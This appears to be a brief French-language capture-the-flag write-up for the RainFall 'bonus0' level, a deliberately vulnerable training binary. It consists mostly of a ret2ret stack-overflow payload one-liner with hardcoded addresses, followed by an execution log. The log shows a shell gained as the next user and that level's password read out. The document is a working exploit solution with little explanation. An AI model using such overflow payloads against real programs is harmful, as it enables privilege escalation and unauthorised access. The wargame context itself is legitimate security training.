# bonus0: RET2RET

> Je decide pour les bonus de ne pas detailler pour que chacun puisse trouver sa propre methode.


### OFFSET
 
 - 
AAAAAAAAAAAAAAAAAAAA 20 octets
 - 
AAAAAAAAABBBBAAAAAAA 20 octets


### PAYLOAD RET2RET

```bash
(python -c 'print "A"*20'; python -c 'print "AAAAAAAAA" + "\xcb\x85\x04\x08" + "\xfc\xfb\xff\xbf" + "AAA"'; cat) | ./bonus0
```
- env : 0xbffffbfc
- ret : 0x080485cb

### EXEC

```bash
bonus0@RainFall:~$ (python -c 'print "A"*20'; python -c 'print "AAAAAAAAA" + "\xcb\x85\x04\x08" + "\xfc\xfb\xff\xbf" + "AAA"'; cat) | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAA��� AAAAAAAAA����AAA���
$ pwd
/home/user/bonus0
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

PLUS QUE 3 ! :)